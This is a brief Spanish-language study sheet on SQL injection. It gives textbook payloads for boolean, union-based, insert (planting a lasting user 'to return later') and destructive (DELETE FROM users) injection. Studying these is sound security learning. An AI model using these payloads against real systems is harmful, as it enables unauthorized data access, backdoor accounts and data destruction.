# SQL Injection

## Boolean-Based SQL Injection

Usa una expresión booleana que siempre regresa true para regresar los valores de las tablas.

```sql
' OR '1'='1
```

## Union-Based SQL Injection

Hacienod un union podemos agregar un resultado a la respuesta vacía.

```sql
' UNION SELECT 1, 'hacked', 'hacked@example.com' --
```

Ese union se puede aprovechar para seleccionar información que puede ser relevante sobre el DBMS.

```sql
' UNION SELECT 1, version(), 'dummy' --
```

## Insert Injection

Dejamos un usuario permamente para regresar más tarde

```sql
'; insert into users (name, email) values ('Erick', 'youhavebeen@hacked.com'); --'
```

## Destructive Injection

Podemos borrar por completo la tabla. (si el permiso lo permite).

```sql
'; DELETE FROM users; --
```